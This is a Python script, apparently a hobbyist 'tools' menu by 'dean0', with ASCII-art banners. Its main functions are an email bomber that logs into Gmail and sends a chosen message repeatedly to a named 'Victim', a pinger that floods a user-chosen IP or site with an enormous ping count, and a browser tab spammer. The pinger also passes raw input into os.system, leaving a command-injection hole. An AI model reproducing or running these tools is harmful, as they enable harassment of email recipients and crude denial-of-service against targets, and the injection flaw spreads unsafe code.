import os, sys, requests, time, smtplib, webbrowser


# Start #
userOS = input("Enter your Operating System [Windows/Linux]: ")
if userOS == 'windows' or userOS == 'Windows' or userOS == 'WINDOWS':
    os.system("Color D")
#Loading Screen:
def logoLoad():
    print('''
    
╭━━━━╮╱╱╱╱╭╮╱╭╮╭━╮╭╮
┃╭╮╭╮┃╱╱╱╱┃┃╱┃┃┃╭╋╯╰╮
╰╯┃┃┣┻━┳━━┫┃╱┃╰╯╯┣╮╭╯
╱╱┃┃┃╭╮┃╭╮┃┃╱┃╭╮┃┣┫┃
╱╱┃┃┃╰╯┃╰╯┃╰╮┃┃┃╰┫┃╰╮
╱╱╰╯╰━━┻━━┻━╯╰╯╰━┻┻━╯
    By dean0
 ---------------   
    Loading...
    ''')
    time.sleep(1.75)


#Menu:
def menu():
    print('''
    Tools:
    1) Pinger
    2) Email Bomber
    3) Website Spammer
    4) Muffin
    5) Color Settings (Windows ONLY!)
    ''')


#Email Bomber
def emailBomber():

    def loadingScreen():
        print('''
     ▓█████  ███▄ ▄███▓ ▄▄▄       ██▓ ██▓        ▄▄▄▄    ▒█████   ███▄ ▄███▓ ▄▄▄▄   ▓█████  ██▀███      
    ▓█   ▀ ▓██▒▀█▀ ██▒▒████▄    ▓██▒▓██▒       ▓█████▄ ▒██▒  ██▒▓██▒▀█▀ ██▒▓█████▄ ▓█   ▀ ▓██ ▒ ██▒   
    ▒███   ▓██    ▓██░▒██  ▀█▄  ▒██▒▒██░       ▒██▒ ▄██▒██░  ██▒▓██    ▓██░▒██▒ ▄██▒███   ▓██ ░▄█ ▒    
    ▒▓█  ▄ ▒██    ▒██ ░██▄▄▄▄██ ░██░▒██░       ▒██░█▀  ▒██   ██░▒██    ▒██ ▒██░█▀  ▒▓█  ▄ ▒██▀▀█▄     
    ░▒████▒▒██▒   ░██▒ ▓█   ▓██▒░██░░██████▒   ░▓█  ▀█▓░ ████▓▒░▒██▒   ░██▒░▓█  ▀█▓░▒████▒░██▓ ▒██▒    
    ░░ ▒░ ░░ ▒░   ░  ░ ▒▒   ▓▒█░░▓  ░ ▒░▓  ░   ░▒▓███▀▒░ ▒░▒░▒░ ░ ▒░   ░  ░░▒▓███▀▒░░ ▒░ ░░ ▒▓ ░▒▓░
     ░ ░  ░░  ░      ░  ▒   ▒▒ ░ ▒ ░░ ░ ▒  ░   ▒░▒   ░   ░ ▒ ▒░ ░  ░      ░▒░▒   ░  ░ ░  ░  ░▒ ░ ▒░
       ░   ░      ░     ░   ▒    ▒ ░  ░ ░       ░    ░ ░ ░ ░ ▒  ░      ░    ░    ░    ░     ░░   ░ 
       ░  ░       ░         ░  ░ ░      ░  ░    ░          ░ ░         ░    ░         ░  ░   ░      

        ''')

        print("Loading...")
        time.sleep(1.75)
        print("\n")

    if userOS == "Windows" or userOS == "windows" or userOS == "WINDOWS":
        os.system("Color B")
    time.sleep(0.15)
    loadingScreen()
    senderEmail = input("Enter Email for Sender (Gmail): ")
    senderPassword = input("Enter Password for Sender: ")
    recEmail = input("Enter your Victim (Person Recieving Email): ")
    emailMsg = input("Enter the message you want to send:\n")
    emailAmount = int(input("Enter how many emails you want to send: "))

    def emailSend():
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(senderEmail, senderPassword)
        server.sendmail(senderEmail, recEmail, emailMsg)
        print("Sent Email!")

    for i in range(emailAmount):
        emailSend()
    print("Done! Sent", emailAmount, "emails")
    input()

def pinger():
    pingTarget = input("Enter IP/Website URL: ")
    os.system("ping "+pingTarget+" -n 1000000000000000000000000000")

def webSpam():
    spamSite = input("Enter the website: ")
    spamAmount = int(input("Enter how many times you want the site opened: "))
    for i in range(spamAmount):
        webbrowser.open(spamSite)
        print("Opened!")
        #Finish
    print("Done! Opened", spamAmount, "tabs")

def colorSettings():
    print('''
    1) Red
    2) Green
    3) Blue
    4) Yellow
    5) White (Bright)
    6) Standard (White; Non-Bright)
    ''')
    colorSet = input("Enter the Number Correlating to the Color you Want: ")
    if colorSet == '1':
        os.system("Color 4")
    elif colorSet == '2':
        os.system("Color A")
    elif colorSet == '3':
        os.system("Color 3")
    elif colorSet == '4':
        os.system("Color E")
    elif colorSet == '5':
        os.system("Color F")
    elif colorSet == '6':
        os.system("Color 7")
    input()

def muffinPic():
    print('''
                                                                                            
                                  ██████                                                
                                ██▒▒▒▒▒▒██                                              
                              ██▒▒  ▒▒▒▒▒▒██                                            
                              ██▒▒  ▒▒▒▒▒▒████████                                      
                              ██▒▒▒▒▒▒▒▒▒▒██░░░░░░████                                  
                                ██▒▒▒▒▒▒██░░░░▓▓░░░░░░████                              
                              ██░░██████░░░░░░░░░░░░  ░░░░██                            
                              ██░░░░░░▒▒░░░░░░░░▒▒░░░░░░░░██                            
                            ██░░░░░░░░░░░░░░░░░░░░░░░░▒▒░░░░██                          
                            ██░░░░▓▓░░░░░░  ░░░░░░░░░░░░░░░░██                          
                          ██░░░░░░░░░░░░░░░░░░░░░░▓▓░░░░░░░░░░██                        
                          ██░░░░░░░░░░░░░░░░▒▒░░░░░░░░░░░░░░░░██                        
                          ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██                        
                            ████████░░░░░░░░██░░░░░░░░░░░░████                          
                              ██▓▓▓▓██░░░░██▓▓██░░░░░░░░████                            
                              ██▓▓▓▓▓▓████▓▓▓▓▓▓██░░░░██  ██                            
                                ██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓████▓▓██                              
                                ██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██                              
                                ██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██                              
                                  ██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██                                
                                    ██████████████████                                  
                                                                                        
    
    ''')
    input()



#User Start
logoLoad()
menu()
userNum = input("Enter Number: ")
if userNum == '1':
    pinger()
if userNum == '2':
    emailBomber()
if userNum == '3':
    webSpam()
if userNum == '4':
    muffinPic()
if userNum == '5':
    colorSettings()





